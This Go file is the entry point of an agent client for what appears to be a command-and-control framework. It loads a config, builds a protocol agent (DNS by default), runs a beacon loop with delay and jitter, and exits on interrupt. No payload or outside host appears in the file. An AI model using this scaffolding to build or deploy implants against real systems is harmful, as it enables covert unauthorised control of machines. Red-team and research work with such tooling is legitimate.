package main

import (
	"context"
	"flag"
	"github.com/faanross/legehniss_C2/internal/composition"
	"github.com/faanross/legehniss_C2/internal/config"
	"github.com/faanross/legehniss_C2/internal/runloop"
	"log"
	"os"
	"os/signal"
)

// assume go run from root, otherwise change path
var pathToConfigYaml = "./configs/main.yaml"

func main() {

	// (1) Command line flag for config file path
	configPath := flag.String("config", pathToConfigYaml, "path to configuration file")
	flag.Parse()

	// (2) Load main configuration
	cfg, err := config.LoadMainConfig(*configPath)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// (3) Create starting protocol agent (usually dns)
	comm, err := composition.NewAgent(cfg)
	if err != nil {
		log.Fatalf("Failed to create communicator: %v", err)
	}

	// (4) Create context for cancellation
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// (5) Start run loop in goroutine
	go func() {
		log.Printf("Starting %s client run loop", cfg.Protocol)
		log.Printf("Delay: %v, Jitter: %d%%", cfg.Delay, cfg.Jitter)

		if err := runloop.RunLoop(ctx, comm, cfg); err != nil {
			log.Printf("Run loop error: %v", err)
		}
	}()

	// (6) Wait for interrupt signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan

	// (7) Shutdown Agent
	log.Println("Shutting down client...")
	cancel() // This will cause the run loop to exit

}
